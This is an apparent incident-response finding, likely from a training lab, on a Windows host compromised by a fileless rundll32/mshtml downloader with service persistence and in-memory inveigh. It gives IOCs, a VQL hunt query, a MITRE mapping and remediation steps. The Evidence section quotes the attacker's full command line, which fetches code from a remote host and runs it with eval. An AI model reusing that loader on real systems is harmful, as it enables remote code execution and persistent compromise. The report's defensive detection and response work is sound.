### Vulnerability Finding: Fileless `rundll32/mshtml` Downloader, Service-based Persistence, and In-memory PowerShell Activity

**Endpoint:** `WIN10.ELS-CHILD.ELS.local`  
**Date Identified:** 12/09/2025  
**Tester:** Mr. Yassine SAHLI

---

## Description

Velociraptor telemetry and VQL interrogation of `WIN10.ELS-CHILD.ELS.local` revealed a **fileless downloader** executed via `rundll32.exe` using the `mshtml,RunHTMLApplication` entry point. The observed command line executes inline JavaScript which:

- Constructs `WinHttp.WinHttpRequest.5.1` and `WScript.Shell` ActiveX objects.  
- Performs a synchronous `GET` to `http://10.100.11.250:80/connect`.  
- Places the returned response into variable `B`, and immediately `eval(B)` to execute the returned code in-process (no disk artifact required).

A malicious Windows service was created on the host to achieve persistence, allowing the downloader to survive reboots. PowerShell ScriptBlock Logging (collected via a Velociraptor VQL flow) shows obfuscated PowerShell payloads and the in-memory loading of the `inveigh` tool, indicating memory-resident tooling and credential/traffic capture activity. Logs also show an obfuscated/typoed binary name `rundl132.exe` in some records, consistent with evasion/artefact manipulation.

This chain — living-off-the-land executable → synchronous fetch → immediate `eval` → service persistence — is a common pattern for stealthy downloaders/C2 loaders that avoid writing payloads to disk.

---

## Impact

- **In-memory execution & stealth:** Reduces forensic artifacts and evades standard antivirus detection.  
- **Remote Command & Control / Lateral movement:** Synchronous fetch + `eval` enables arbitrary payload delivery from `10.100.11.250`, allowing C2, remote execution, or lateral movement.  
- **Credential / network abuse:** `inveigh` presence implies potential credential harvesting (LLMNR/NBNS/NTLM) and internal reconnaissance.  
- **Persistent foothold:** Malicious service allows automatic re-establishment after reboot.  
- **High operational risk:** Combination of fileless execution, credential tooling, and persistence increases attacker capability and dwell time.

This is a **high-risk** incident requiring immediate containment.

---

## Evidence

1. **Velociraptor Service Creation Flow (malicious service created):**  
   - Artifact collected: `Windows.Events.ServiceCreation` showing service creation context and associated command line.  
   - Observed command (excerpt):
   ```powershell
   C:\Windows\system32\cmd.exe /Q /c rundll32.exe javascript:...mshtml,RunHTMLApplication;
   document.write();
   h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
   w = new ActiveXObject("WScript.Shell");
   h.Open("GET", "http://10.100.11.250:80/connect", false);
   h.Send();
   B = h.ResponseText;
   eval(B);
```
![[Pasted image 20250912084817.png]]

2. **Velociraptor Flow launch screenshots:**  
   - Evidence of actions taken in Velociraptor UI to collect service creation and to run VQL.  
   ![[Pasted image 20250912084544.png]] ![[Pasted image 20250912084750.png]]

3. **PowerShell ScriptBlock Logging results (VQL query output):**  
   - VQL used:
   ```sql
   SELECT EventData, System.TimeCreated.SystemTime
   FROM parse_evtx(
       filename='c:/windows/system32/winevt/logs/Microsoft-Windows PowerShell%4Operational.evtx'
   )
   WHERE EventData CONTAINS "rundll32"
      OR EventData CONTAINS "mshtml"
      OR EventData CONTAINS "WinHttp.WinHttpRequest"
```

- Output shows obfuscated PowerShell execution and in-memory downloader payloads.  
  ![[Pasted image 20250912114003.png]] ![[Pasted image 20250912114045.png]] ![[Pasted image 20250912113548.png]]

4. **Indicators of Compromise (IOCs):**
   - **Network:** `http://10.100.11.250:80/connect`  
   - **Command/Technique:** `rundll32.exe javascript:...mshtml,RunHTMLApplication` with synchronous `WinHttp.WinHttpRequest`.  
   - **Tooling:** `inveigh` loaded in memory (PowerShell telemetry).  
   - **Artefact anomaly:** `rundl132.exe` in logs (possible evasion/typoed binary name).

---

## MITRE ATT&CK Mapping

- **Execution**
  - **T1218.011 – Signed Binary Proxy Execution: rundll32**  
  - **T1059.001 – Command and Scripting Interpreter: PowerShell**
- **Persistence**
  - **T1543.003 – Create or Modify System Process: Windows Service**
- **Defense Evasion**
  - **T1027 – Obfuscated Files or Information**  
  - **T1564.002 – Hide Artifacts: In-memory execution**
- **Credential Access / Discovery**
  - **T1552 / T1087 family** — presence of `inveigh` implies credential/LLMNR/NetBIOS/NTLM harvesting
- **Command and Control**
  - **T1071.001 – Application Layer Protocol: Web Protocols**

---

## Recommendation

**Immediate (Containment & Evidence Preservation):**
- Isolate `WIN10.ELS-CHILD.ELS.local` from the network (remove from switch/VLAN or block at firewall).  
- Capture full volatile evidence BEFORE remediation: full memory image, running process list, loaded modules, service registry entries, scheduled tasks, and Velociraptor flow exports.  
- Preserve Velociraptor artifacts and VQL outputs; take filesystem and registry snapshots.

**Eradication & Recovery:**
- After evidence capture, stop and disable the malicious Windows service and any related scheduled tasks.  
- Use EDR to detect and terminate in-memory tooling (e.g., `inveigh`) and quarantine affected processes.  
- Remove suspicious registry keys and persisted artifacts. If compromise depth is uncertain, re-image the host and restore from a known-good backup.  
- Rotate credentials for accounts potentially exposed and enforce multifactor authentication (MFA).

**Network & Perimeter Controls:**
- Block outbound communication to `10.100.11.250` and other identified malicious endpoints at perimeter and internal segmentation points.  
- Add IDS/IPS and firewall detection rules to flag or block `WinHttp`-based synchronous HTTP fetch patterns and `rundll32` invoking `mshtml`.  
- Monitor internal DNS, LLMNR, and NetBIOS traffic for signs of name resolution abuse.

**Detection & Hardening:**
- Ensure PowerShell ScriptBlock Logging, Module Logging, and Sysmon (command-line / network logging) are enabled and centralized.  
- Create EDR/Velociraptor detection rules for:
  - `rundll32.exe` invoking `mshtml,RunHTMLApplication` or similar script-hosting endpoints.  
  - Processes performing synchronous `WinHttp.WinHttpRequest` followed by dynamic code execution (`eval`-like behavior).  
  - Service Creation events with command-lines containing URL or script patterns.
- Implement application control (AppLocker / Windows Defender Application Control) to restrict execution of signed system binaries with unexpected script-like arguments.  
- Harden service creation permissions and centrally alert on Service Creation events.

**Hunt & Post-incident Activities:**
- Hunt across the 10.100.11.0/24 subnet and the Velociraptor client fleet for:
  - Similar service creation events.  
  - PowerShell ScriptBlock logs referencing the same IOCs.  
  - Clients contacting `10.100.11.250` or exhibiting `inveigh` behavior.
- Correlate proxy, firewall, and DNS logs to map attacker infrastructure and lateral movement.  
- Conduct credential resets for suspected-compromised accounts and apply conditional access / MFA policies.

---

**Severity:** High  
**CVSSv3.1 Score:** 8.8 (High – fileless in-memory execution + network C2 + persistence via service)
